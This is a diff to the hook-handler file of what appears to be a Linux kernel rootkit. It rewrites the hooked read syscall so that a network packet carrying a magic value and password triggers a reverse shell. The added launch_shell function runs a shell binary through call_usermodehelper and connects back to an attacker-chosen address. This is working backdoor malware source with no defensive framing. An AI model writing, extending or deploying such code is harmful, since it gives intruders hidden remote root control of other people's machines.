@@ -27,7 +27,11 @@
  * Here the hook handlers.
  */
 
+#include <linux/kmod.h>
 #include "hooks.h"
+#include "kernel.h"
+#include "arprk-conf.h"
+#include "rshell.h"
 
 asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
 	int ret = 0;
@@ -45,94 +49,43 @@ asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned i
     return ret;
 }
 
-#define RSHELL_KEY "OLA K ASE\n"
-
 asmlinkage int my_read64(int fd, void *buf, size_t len) {
-	//int ret = 0;
 	char *ubuf = NULL;
-	int nread = 0;
-	/*
-	pid_t pid = 0;
-	off_t from = 0, to = 0;
-	struct read_queue *queue = NULL;
-
-	pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
-
-	// serve queue as request if there's one.
-	if ((queue = get_read_queue(pid))) {
-		ubuf = queue->ubuf;
-		from = queue->from;
-		to = queue->to;
-
-		nread = to - from;
-		if (nread <= len) {
-			f_memcpy(buf, ubuf + from, nread);
-			destroy_read_queue(pid);
-			SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
-			return nread;
-		} else {
-			f_memcpy(buf, ubuf + from, len);
-			update_read_queue(pid, ubuf, from + len, to);
-			return len;
-		}
-	} else {
-		// check if the pending data is the shell request
-		ret = SYSCALL64(__NR_ioctl, fd, FIONREAD, &nread, 0, 0, 0);
-		f_printk("ioctl ret = %d\n", ret);
-		if (!ret) {
-			if (nread == sizeof(RSHELL_KEY) - 1) {
-				f_printk("%d bytes to read\n", nread);
-				ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-				if (ubuf == MAP_FAILED) {
-					return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
-				}
-				ret = SYSCALL64(__NR_read, fd, ubuf, nread, 0, 0, 0);
-				if (ret < 0) {
-					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
-					return my_read64(fd, buf, len);
-				}
-				if (f_strncmp(RSHELL_KEY, ubuf, nread) == 0) {
-					f_printk("GOT RSHELL REQUEST!\n");
-					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
-					return my_read64(fd, buf, len);
-				}
-				// at this point, we received a same sized than the shell request packet, but it's not a request packet.
-				// so, we must queue it, if the user read less than we did, and leave it to the users, the same speed they read,
-				// on the next calls to sys_read() (which is now my_read64()).
-				if (nread <= len) {
-					f_memcpy(buf, ubuf, nread);
-					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
-					return nread;
-				} else {
-					f_memcpy(buf, ubuf, len);
-					create_read_queue(pid, ubuf, len, nread);
-					return len;
-				}
-			}
-		}
-	}
-
-	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
-	*/
+	int nread = 0, *addr_len = NULL, ret = 0;
+	struct rshell_req *req = NULL;
+	struct sockaddr_in *addr = NULL;
 
 	ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	addr = (struct sockaddr_in *) (ubuf + 2048);
+	addr_len = (int *) (ubuf + 2048 + sizeof(struct sockaddr_in));
 	if (ubuf != MAP_FAILED) {
 		// MSG_KEEP is the key to keep the data in the queue.
 		// then we can compare and serve it without doing a lot of work.
-		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, MSG_PEEK, 0, 0);
-		if (nread >= 0) {
-			f_printk("recvfrom %d bytes\n", nread);
-		}
-		if (nread == sizeof(RSHELL_KEY) - 1 && f_memcmp(ubuf, RSHELL_KEY, nread) == 0) {
-			f_printk("GOT RSHELL REQUEST\n");
-			// empty buffer
-			nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, 0, 0, 0);
-			if (nread == sizeof(RSHELL_KEY) - 1) {
-				f_printk("emptying buffer and calling myself...\n");
+		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, 2048, MSG_PEEK, NULL, NULL);
+		if (nread == sizeof(struct rshell_req)) {
+			req = (struct rshell_req *) ubuf;
+			if (f_memcmp(req->magic, RSHELL_MAGIC, sizeof(RSHELL_MAGIC)) == 0 && f_memcmp(req->password, RSHELL_PASSWORD, sizeof(RSHELL_PASSWORD)) == 0) {
+				f_printk("GOT RSHELL REQUEST\n");
+				// if client didn't specify a connect-back IP, use the one from sys_recvmsg().
+				if (!req->reverse.sin_addr.s_addr) {
+					*addr_len = sizeof(struct sockaddr_in);
+					ret = SYSCALL64(__NR_getpeername, fd, addr, addr_len, 0, 0, 0);
+					//f_printk("ret = %d, *addr_len = %d, addr = %ld\n", ret, *addr_len, addr->sin_addr.s_addr);
+					if (!ret && *addr_len == sizeof(struct sockaddr_in)) {
+						req->reverse.sin_addr.s_addr = addr->sin_addr.s_addr;
+						launch_shell(req->reverse);
+					}
+				} else {
+					launch_shell(req->reverse);
+				}
+				// empty buffer
+				nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(struct rshell_req), 0, 0, 0);
+				if (nread == sizeof(struct rshell_req)) {
+					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+					return my_read64(fd, buf, len);
+				}
 				SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
-				return my_read64(fd, buf, len);
 			}
-			SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
 		}
 		SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
 	}
@@ -142,4 +95,15 @@ asmlinkage int my_read64(int fd, void *buf, size_t len) {
 
 asmlinkage int my_read32(int fd, void *buf, size_t len) {
 	return 0;
+}
+
+int launch_shell(struct sockaddr_in dest) {
+	char *envp[] = { NULL }, *argv[] = { RSHELL_PATH, "255.255.255.255", "65535", NULL };
+	int ret = 0;
+	
+	snprintf(argv[1], 16, "%pI4", &dest.sin_addr.s_addr);
+	snprintf(argv[2], 6, "%hu", ntohs(dest.sin_port));
+	f_printk("addr = %s, port = %s\n", argv[1], argv[2]);
+	ret = f_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+	return ret;
 }
